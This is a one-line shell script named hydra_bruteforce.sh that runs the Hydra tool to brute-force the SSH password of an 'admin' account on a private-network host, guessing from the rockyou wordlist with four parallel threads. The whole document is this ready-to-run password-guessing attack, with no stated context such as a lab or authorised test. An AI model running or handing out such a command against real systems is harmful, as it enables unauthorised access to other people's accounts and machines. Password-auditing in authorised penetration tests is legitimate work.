# hydra_bruteforce.sh:

hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 4 ssh://192.168.1.15
